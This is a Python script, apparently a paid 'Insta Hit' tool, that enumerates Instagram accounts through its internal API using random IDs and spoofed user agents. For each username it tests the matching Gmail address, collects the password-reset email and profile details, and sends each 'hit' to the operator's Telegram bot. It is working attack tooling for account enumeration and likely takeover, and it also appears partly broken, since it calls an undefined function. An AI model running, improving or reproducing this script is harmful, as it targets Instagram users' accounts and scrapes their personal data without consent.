import os
try:
    import requests
    import time
    import hashlib
    import uuid
    from secrets import token_hex
    import pycountry
    import random
    from OneClick import Hunter
    from ms4 import InfoIG, RestInsta, UserAgentGenerator
    import threading
    from rich.console import Console
    from rich.table import Table
    from rich.text import Text
    import json
    import string
    from user_agent import generate_user_agent
except:
    os.system("pip install OneClick stdiomask requests uuid ms4==2.10.0")

import requests
import time
import hashlib
import uuid
import pycountry
import random
import threading
import json
import string
from secrets import token_hex
from rich.console import Console
from rich.table import Table
from rich.text import Text
from user_agent import generate_user_agent
from OneClick import Hunter
from ms4 import InfoIG, RestInsta, UserAgentGenerator

# Terminal colors
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'

# Banner Function
def nx():
    os.system("clear")
    print("Debug: Displaying Banner")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] Tool Status    : {B}| Paid
|{F}[+] TeleGram   : {B} @Shahil440    
|{F}[+] Privacy  : {B} Private Script 
|{F}[+] Tool       : {B} Insta Hit 
{E}==============================
"""
    for mm in Banner.splitlines():
        time.sleep(0.05)
        print(mm)

nx()

# Getting user input
token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
print(f"Debug: Token received: {token}")

print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)
print(f"Debug: User ID received: {ID}")

console = Console()
bb = 0
gg = 0
bm = 0
gm = 0
hit = 0

# Telegram Function
def Tele(email):
    global hit
    print(f"Debug: Sending Telegram message for {email}")

    user = email.split("@")[0]
    hit += 1

    try:
        rest = RestInsta.Rest(user)["email"]
    except Exception as e:
        print("Debug: Error in RestInsta.Rest:", e)
        rest = "Nothing To Rest"

    try:
        inf = InfoIG.Instagram_Info(user)
        name = inf["Name"]
        Id = inf["ID"]
        fols = inf["Followers"]
        folg = inf["Following"]
        bio = inf["Bio"]
        po = inf["Posts"]
        pr = inf["Is Private"]
    except Exception as e:
        print("Debug: Error fetching Instagram info:", e)
        return

    tlg = f'''
🤤 Email ==> {email}
🫣 Email Rest ==> {rest}
😛 Username ==> @{user}
🤔 Name ==> {name}
🤫 ID ==> {Id}
😤 Followers ==> {fols}
😥 Following ==> {folg}
😳 Bio ==> {bio}
😵 Posts ==> {po}
🤧 Is Private ==> {pr}
🦁 URL ==> https://www.instagram.com/{user}
'''
    print(F + tlg)

    try:
        response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        print("Debug: Telegram response:", response.text)
    except Exception as e:
        print("Debug: Error sending Telegram message:", e)

    with open('hits.txt', 'a') as f:
        f.write(tlg + '\n')

# Check Gmail function
def CheckGmail(username):
    global gg, bb
    email = f"{username}@gmail.com"
    print(f"Debug: Checking Gmail for {email}")

    url = "https://i.instagram.com/api/v1/users/lookup/"
    headers = {'User-Agent': str(Hunter.Services())}

    try:
        response = requests.post(url, headers=headers, timeout=10)
        print("Debug: Instagram API response status:", response.status_code)

        if '"status":"ok"' in response.text:
            gg += 1
            check_gmail(email)
        else:
            bb += 1
    except Exception as e:
        print("Debug: Error in Instagram API request:", e)
        bb += 1

    os.system('clear')
    table = Table(title=f"{O}Instagram HITS")
    table.add_column("Type", justify="center", style="cyan")
    table.add_column("Count", justify="center", style="magenta")

    table.add_row("Hits", Text(str(hit), style="green"))
    table.add_row("GoodInsta", Text(str(gg), style="yellow"))
    table.add_row("BadInsta", Text(str(bb), style="red"))
    table.add_row("GoodEmail", Text(str(gm), style="blue"))
    table.add_row("BadEmail", Text(str(bm), style="red"))

    console.print(table)

# Username Generator
def get_username():
    print("Debug: Running get_username()")
    while True:
        try:
            LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            bol = json.dumps({"id": str(random.randrange(128053904, 53186034340)), "render_surface": "PROFILE"})

            response = requests.post("https://www.instagram.com/api/graphql",
                                     headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator)},
                                     data={"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"},
                                     timeout=10)

            print("Debug: Instagram username request status:", response.status_code)
            print("Debug: Full Instagram API response:", response.text)

            if response.status_code == 200:
                data = response.json()
                if data.get("data"):
                    username = data["data"].get("user", {}).get("username")
                    if username:
                        print(f"Debug: Found username {username}")
                        CheckGmail(username)
                    else:
                        print("Debug: No username found in response.")
                else:
                    print("Debug: Instagram response missing expected data.")

        except Exception as e:
            print("Debug: Error in get_username:", e)

# Start Threads
print("Debug: Starting threads")
threads = []
for i in range(5):  # Reduced thread count for testing
    t = threading.Thread(target=get_username)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
